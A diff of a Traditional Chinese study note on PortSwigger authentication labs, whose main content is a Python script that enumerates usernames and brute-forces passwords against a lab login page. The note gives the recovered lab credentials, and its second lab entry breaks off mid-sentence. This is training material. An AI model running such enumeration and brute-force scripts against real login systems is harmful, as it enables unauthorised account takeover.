@@ -113,112 +113,115 @@ Ref: [https://portswigger.net/web-security/authentication](https://portswigger.n
 
 * **回應時間**：如果大多數請求都以相似的回應時間處理，任何偏離此時間的請求都表明幕後發生了不同的事情。這是猜測的用戶名可能正確的另一個指示。例如，網站可能只有在用戶名有效時才檢查密碼是否正確。這個額外步驟可能導致回應時間略微增加。這可能很微妙，但攻擊者可以透過輸入過長的密碼使網站需要明顯更長時間處理，從而使這種延遲更加明顯。
 
-* **Lab: [Username enumeration via different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)**
-    1. 寫程式爆破帳號和密碼：
-        ```python
-        import requests
+::: tip **Lab: [Username enumeration via different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)**
+1. 寫程式爆破帳號和密碼：
+    ```python
+    import requests
 
-        def init():
-            global cookies, headers, data
-            cookies = {
-                'session': 'H1Uhv8fuWXoes5VysCN1ORMv2Nc42qj9',
-            }
+    def init():
+        global cookies, headers, data
+        cookies = {
+            'session': 'H1Uhv8fuWXoes5VysCN1ORMv2Nc42qj9',
+        }
 
-            headers = {
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'accept-language': 'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
-                'cache-control': 'no-cache',
-                'content-type': 'application/x-www-form-urlencoded',
-                'dnt': '1',
-                'origin': 'https://0a0c008d03de822e80d7fdae008d005f.web-security-academy.net',
-                'pragma': 'no-cache',
-                'priority': 'u=0, i',
-                'referer': 'https://0a0c008d03de822e80d7fdae008d005f.web-security-academy.net/login',
-                'sec-ch-ua': '"Not.A/Brand";v="99", "Chromium";v="136"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"macOS"',
-                'sec-fetch-dest': 'document',
-                'sec-fetch-mode': 'navigate',
-                'sec-fetch-site': 'same-origin',
-                'sec-fetch-user': '?1',
-                'upgrade-insecure-requests': '1',
-                'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
-                # 'cookie': 'session=H1Uhv8fuWXoes5VysCN1ORMv2Nc42qj9',
-            }
+        headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+            'cache-control': 'no-cache',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dnt': '1',
+            'origin': 'https://0a0c008d03de822e80d7fdae008d005f.web-security-academy.net',
+            'pragma': 'no-cache',
+            'priority': 'u=0, i',
+            'referer': 'https://0a0c008d03de822e80d7fdae008d005f.web-security-academy.net/login',
+            'sec-ch-ua': '"Not.A/Brand";v="99", "Chromium";v="136"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"macOS"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
+            # 'cookie': 'session=H1Uhv8fuWXoes5VysCN1ORMv2Nc42qj9',
+        }
 
-            data = {
-                'username': '1322',
-                'password': '123123',
-            }
+        data = {
+            'username': '1322',
+            'password': '123123',
+        }
 
-        def enum_username():
-            with open('username.txt', 'r') as f:
-                usernames = f.readlines()
-                for i in usernames:
-                    data = {
-                        'username': i.strip(),
-                        'password': '123',
-                    }
+    def enum_username():
+        with open('username.txt', 'r') as f:
+            usernames = f.readlines()
+            for i in usernames:
+                data = {
+                    'username': i.strip(),
+                    'password': '123',
+                }
 
-                    response = requests.post(
-                        'https://0a0c008d03de822e80d7fdae008d005f.web-security-academy.net/login',
-                        cookies=cookies,
-                        headers=headers,
-                        data=data,
-                    )
-                    
-                    print(f'\rTrying username: {i.strip()}        ', end='')
+                response = requests.post(
+                    'https://0a0c008d03de822e80d7fdae008d005f.web-security-academy.net/login',
+                    cookies=cookies,
+                    headers=headers,
+                    data=data,
+                )
+                
+                print(f'\rTrying username: {i.strip()}        ', end='')
 
-                    if 'Invalid username' not in response.text:
-                        print(f'\nFound username: {i.strip()}')
-                        break
+                if 'Invalid username' not in response.text:
+                    print(f'\nFound username: {i.strip()}')
+                    break
 
-        def enum_password():
-            with open('password.txt', 'r') as f:
-                passwords = f.readlines()
-                for i in passwords:
-                    data = {
-                        'username': 'ansible',
-                        'password': i.strip(),
-                    }
+    def enum_password():
+        with open('password.txt', 'r') as f:
+            passwords = f.readlines()
+            for i in passwords:
+                data = {
+                    'username': 'ansible',
+                    'password': i.strip(),
+                }
 
-                    response = requests.post(
-                        'https://0a0c008d03de822e80d7fdae008d005f.web-security-academy.net/login',
-                        cookies=cookies,
-                        headers=headers,
-                        data=data,
-                    )
-                    
-                    print(f'\rTrying password: {i.strip()}              ', end='')
+                response = requests.post(
+                    'https://0a0c008d03de822e80d7fdae008d005f.web-security-academy.net/login',
+                    cookies=cookies,
+                    headers=headers,
+                    data=data,
+                )
+                
+                print(f'\rTrying password: {i.strip()}              ', end='')
 
-                    if 'Incorrect password' not in response.text:
-                        print(f'\nFound password: {i.strip()}')
-                        break
+                if 'Incorrect password' not in response.text:
+                    print(f'\nFound password: {i.strip()}')
+                    break
 
-        if __name__ == '__main__':
-            init()
-            enum_password()
-        ```
-    2. 取得正確帳號為 `ansible`，密碼為 `michelle`，登入後即完成 Lab。
+    if __name__ == '__main__':
+        init()
+        enum_password()
+    ```
+2. 取得正確帳號為 `ansible`，密碼為 `michelle`，登入後即完成 Lab。
+:::
 
-* **Lab: [Username enumeration via subtly different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses)**
-    1. 嘗試任意登入，發現回應 `Invalid username or password.`
-    2. 使用 Burp 的 Intruder 枚舉使用者名稱，然而
+::: tip **Lab: [Username enumeration via subtly different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses)**
 
+1. 嘗試任意登入，發現回應 `Invalid username or password.`
+2. 使用 Burp 的 Intruder 枚舉使用者名稱，然而
+:::
 
 
 ## 第三方身分驗證機制的漏洞
 
 如果你很喜歡破解身分驗證機制並且已經完成所有身分驗證的題目，你可能會像嘗試 OAuth 身分驗證的 Labs。
 
-> [!note]
->
-> [OAuth authentication](https://portswigger.net/web-security/oauth)
+::: info Read more
+[OAuth authentication](https://portswigger.net/web-security/oauth)
+:::
 
 ## 防止對你自己的身分驗證機制的攻擊
 
 我們已經展示了網站因實施身份驗證的方式而可能存在漏洞的幾種方式。為了降低你自己的網站遭受此類攻擊的風險，應該嘗試遵守幾項原則。
 
-> [!note]
->
-> [如何使身分驗證機制安全](https://portswigger.net/web-security/authentication/securing)
+::: info Read more
+
+* [如何使身分驗證機制安全](https://portswigger.net/web-security/authentication/securing)
+:::
